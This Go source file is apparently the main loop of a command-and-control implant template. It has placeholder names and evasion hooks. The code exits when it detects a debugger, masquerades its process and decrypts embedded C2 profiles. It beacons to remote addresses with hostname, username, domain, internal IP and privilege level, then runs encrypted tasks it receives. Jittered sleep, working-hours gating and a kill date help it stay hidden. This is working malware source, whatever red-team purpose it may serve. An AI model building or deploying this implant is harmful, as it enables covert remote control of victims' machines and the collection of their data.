package main

import (
	"encoding/binary"
	"math/rand/v2"
	"net"
	"os"
	"runtime"
	"sync"
	"time"

	"__NAME__/crypto"
	"__NAME__/impl"
	"__NAME__/protocol"
	// __EVASION_MAIN_IMPORT__
)

// ─── Global state ──────────────────────────────────────────────────────────────

var (
	agent impl.AgentImpl

	stateMu     sync.RWMutex
	agentSleep  int   // seconds
	agentJitter int   // 0-90 %
	killDate    int64 // unix timestamp; 0 = disabled
	workStart   int   // HHMM e.g. 900
	workEnd     int   // HHMM e.g. 1700
)

// ─── Entry point ───────────────────────────────────────────────────────────────

func main() {
	if len(encProfiles) == 0 {
		os.Exit(1)
	}

	agent = impl.New()

	if agent.IsDebugged() {
		os.Exit(0)
	}

	agent.Masquerade()
	agent.OnStart()

	// __EVASION_INIT__

	// Try each embedded profile in order until one succeeds.
	for _, blob := range encProfiles {
		if len(blob) < 32 {
			continue
		}
		key := blob[:32]
		encData := blob[32:]

		plaintext, err := crypto.DecryptData(encData, key)
		if err != nil {
			continue
		}

		// Parse the profile from the decrypted binary blob.
		profile, err := protocol.ParseProfile(plaintext)
		if err != nil {
			continue
		}

		crypto.SKey = key
		initProfileState(profile)
		run(profile)
	}
}

func initProfileState(p *protocol.Profile) {
	stateMu.Lock()
	defer stateMu.Unlock()
	agentSleep = p.Sleep
	agentJitter = p.Jitter
	killDate = p.KillDate
	workStart = p.WorkStart
	workEnd = p.WorkEnd
}

// ─── Connection loop ───────────────────────────────────────────────────────────

func run(profile *protocol.Profile) {
	connCount := 0
	maxConn := profile.ConnCount

	for {
		if shouldExit() {
			os.Exit(0)
		}

		waitForWorkingHours()

		addr := profile.Addresses[connCount%len(profile.Addresses)]
		connCount++

		conn, err := agent.Dial(addr, profile)
		if err != nil {
			sleepWithJitter()
			if maxConn > 0 && connCount >= maxConn {
				os.Exit(0)
			}
			continue
		}

		connCount = 0

		// Build the init beat and send it encrypted.
		beat := buildBeat(profile)

		// InitPack: [BE uint32 agentType][BE uint32 agentId][raw beat]
		hdr := make([]byte, 8)
		binary.BigEndian.PutUint32(hdr[0:4], profile.Type)
		binary.BigEndian.PutUint32(hdr[4:8], rand.Uint32())
		initData := append(hdr, beat...)

		encrypted, err := crypto.EncryptData(initData, crypto.SKey)
		if err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		if err = protocol.SendMsg(conn, encrypted); err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		taskLoop(conn)
		conn.Close()
		sleepWithJitter()
	}
}

func taskLoop(conn net.Conn) {
	for {
		if shouldExit() {
			return
		}
		waitForWorkingHours()

		data, err := protocol.RecvMsg(conn)
		if err != nil || data == nil {
			return
		}

		plaintext, err := crypto.DecryptData(data, crypto.SKey)
		if err != nil {
			return
		}

		responses := TaskProcess(plaintext)
		if responses == nil {
			continue
		}

		// Optional: compress large responses.
		// responses, _ = protocol.CompressZlib(responses)

		enc, err := crypto.EncryptData(responses, crypto.SKey)
		if err != nil {
			return
		}

		if err = protocol.SendMsg(conn, enc); err != nil {
			return
		}

		sleepWithJitter()
	}
}

// ─── Beat (registration) ──────────────────────────────────────────────────────
// The beat format must match the server's CreateAgent Packer expectations.

func buildBeat(p *protocol.Profile) []byte {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	internalIP := ""
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			if addrs, err := iface.Addrs(); err == nil {
				for _, a := range addrs {
					if ipNet, ok := a.(*net.IPNet); ok && ipNet.IP.To4() != nil {
						internalIP = ipNet.IP.String()
						goto doneIP
					}
				}
			}
		}
	}
doneIP:

	w := protocol.NewWriterBE()

	// Fields in the exact order the server's CreateAgent parses them:
	w.WriteUint32(uint32(p.Sleep))                    // Sleep
	w.WriteUint32(uint32(p.Jitter))                   // Jitter
	w.WriteUint32(uint32(p.KillDate))                 // KillDate
	w.WriteUint32(0)                                  // WorkingTime
	w.WriteUint16(0)                                  // ACP
	w.WriteUint16(0)                                  // OemCP
	w.WriteUint8(0)                                   // GmtOffset
	w.WriteUint16(uint16(os.Getpid()))                // Pid
	w.WriteUint16(0)                                  // Tid
	w.WriteUint32(0)                                  // BuildNumber — TODO: fill from OS
	w.WriteUint8(0)                                   // MajorVersion — TODO: fill from OS
	w.WriteUint8(0)                                   // MinorVersion — TODO: fill from OS
	w.WriteUint32(protocol.IPv4ToUint32(internalIP))  // InternalIp

	// Flags: bit 0=arch64, 1=sysArch64, 2=elevated, 3=isServer
	flags := byte(0)
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		flags |= 0x01 | 0x02
	}
	if agent.IsElevated() {
		flags |= 0x04
	}
	w.WriteUint8(flags)

	w.WriteBytes(crypto.SKey)                  // SessionKey
	w.WriteBytes([]byte(os.Getenv("USERDOMAIN"))) // Domain
	w.WriteBytes([]byte(hostname))             // Computer
	w.WriteBytes([]byte(username))             // Username
	w.WriteBytes([]byte(processName()))        // Process

	return w.Bytes()
}

func processName() string {
	exe, err := os.Executable()
	if err != nil {
		return "__NAME__"
	}
	for i := len(exe) - 1; i >= 0; i-- {
		if exe[i] == '/' || exe[i] == '\\' {
			return exe[i+1:]
		}
	}
	return exe
}

// ─── Stealth helpers ───────────────────────────────────────────────────────────

func sleepWithJitter() {
	stateMu.RLock()
	s := agentSleep
	j := agentJitter
	stateMu.RUnlock()

	if s <= 0 {
		s = 60
	}
	sleepMs := s * 1000
	if j > 0 {
		delta := int(float64(sleepMs) * float64(j) / 100.0)
		sleepMs += int(rand.Int64N(int64(delta*2+1))) - delta
		if sleepMs < 500 {
			sleepMs = 500
		}
	}
	time.Sleep(time.Duration(sleepMs) * time.Millisecond)
}

func shouldExit() bool {
	stateMu.RLock()
	kd := killDate
	stateMu.RUnlock()
	if kd == 0 {
		return false
	}
	return time.Now().Unix() >= kd
}

func waitForWorkingHours() {
	for {
		stateMu.RLock()
		ws := workStart
		we := workEnd
		stateMu.RUnlock()

		if ws == 0 && we == 0 {
			return
		}

		now := time.Now()
		hhmm := now.Hour()*100 + now.Minute()

		if ws <= we {
			if hhmm >= ws && hhmm < we {
				return
			}
		} else {
			if hhmm >= ws || hhmm < we {
				return
			}
		}

		time.Sleep(60 * time.Second)
	}
}
